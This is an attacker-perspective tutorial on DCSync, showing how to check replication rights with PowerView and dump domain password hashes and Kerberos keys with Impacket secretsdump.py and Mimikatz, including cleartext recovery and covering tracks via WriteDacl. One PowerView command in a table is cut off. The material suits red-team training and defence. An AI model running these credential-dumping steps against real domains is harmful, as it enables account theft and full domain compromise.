# **DCSync: Domain Controller Synchronization**

### **Overview**

**DCSync** is a technique used to steal the Active Directory password database by leveraging the **Directory Replication Service Remote Protocol**. Domain Controllers (DCs) use this protocol to replicate domain data. By mimicking a DC, an attacker can request a Domain Controller to replicate passwords via the **DS-Replication-Get-Changes-All** extended access control right.

**Attack Implications:**

- Retrieval of current **NTLM password hashes** for any domain user.
- Access to **previous password hashes** (password history).
- Potential for full domain compromise and long-term persistence (e.g., targeting the `krbtgt` account).

---

### **1. Enumerating Replication Privileges**

Before attempting the attack, you must verify if the compromised account possesses the necessary rights: **Replicating Directory Changes** and **Replicating Directory Changes All**. While Domain and Enterprise Admins have these by default, they are often misconfigured on standard accounts.

#### **Step 1: Identify Target User SID**

Use **PowerView** to retrieve the SID of the user you control.

```
Get-DomainUser -Identity <USERNAME> | select samaccountname, objectsid
```

#### **Step 2: Check Domain Object ACLs**

Verify if the user's SID is associated with replication rights on the domain object.

```
$sid= "<USER_SID>"
Get-ObjectAcl "DC=<DOMAIN_PART1>,DC=<DOMAIN_PART2>" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} | select AceQualifier, ObjectDN, ActiveDirectoryRights, SecurityIdentifier, ObjectAceType | fl
```

**Goal:** Confirm the presence of `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All`.

---

### **2. Executing the Attack (Linux Host)**

Use **Impacket's secretsdump.py** to perform the attack remotely. This is preferred when you have network connectivity to the DC but are operating from a Linux attack machine.

|Parameter|Purpose|
|:--|:--|
|`-outputfile <FILE_NAME>`|Writes hashes/keys to files with the specified prefix.|
|`-just-dc`|Extracts NTLM hashes and Kerberos keys from the NTDS file.|
|`-just-dc-ntlm`|Extracts only NTLM hashes.|
|`-just-dc-user <USERNAME>`|Targets a specific user instead of the entire database.|
|`-pwd-last-set`|Shows when each account's password was last changed.|
|`-history`|Dumps password history for offline cracking/auditing.|
|`-user-status`|Checks if users are disabled; useful for filtering audit data.|

**Workflow:**

```
secretsdump.py -outputfile <PREFIX> -just-dc <DOMAIN>/<USERNAME>@<TARGET_IP>
```

_Note: This generates three files: `.ntds` (NTLM hashes), `.ntds.kerberos` (Kerberos keys), and `.ntds.cleartext` (if reversible encryption is enabled)._

---

### **3. Executing the Attack (Windows Host)**

Use **Mimikatz** to perform the attack locally. This requires execution in the context of the user who possesses DCSync privileges.

#### **Step 1: Spawn Process as Privileged User**

If your current session is not the privileged user, use `runas.exe`.

```
runas /netonly /user:<DOMAIN>\<USERNAME> powershell
```

#### **Step 2: Extract Hashes via Mimikatz**

Target a specific user (e.g., Administrator or krbtgt) to retrieve their credentials.

```
.\mimikatz.exe
privilege::debug
lsadump::dcsync /domain:<DOMAIN> /user:<DOMAIN>\<TARGET_USERNAME>
```

---

### **4. Handling Reversible Encryption**

If an account has **"Store password using reversible encryption"** enabled, the password is encrypted with **RC4**, and the key (Syskey) is stored in the registry. Tools like `secretsdump.py` will automatically decrypt these if run with sufficient privileges.

**Misconfiguration Identification:**

|Tool|Command|
|:--|:--|
|**Get-ADUser**|`Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl`|
|**PowerView**|`Get-DomainUser -Identity *|

**Why it matters:** Accounts set this way allow for the direct extraction of **cleartext passwords** from the NTDS file without requiring offline cracking.

---

### **Dangerous/Misconfigured Settings**

|Setting|Implication|
|:--|:--|
|**Replication-Get-Changes-All**|Granted to non-admin users; allows full domain hash dumping.|
|**ENCRYPTED_TEXT_PWD_ALLOWED**|Stored in reversible RC4; allows cleartext password recovery via DCSync.|
|**WriteDacl over User**|An attacker can grant themselves DCSync rights, dump hashes, and then remove the rights to hide tracks.|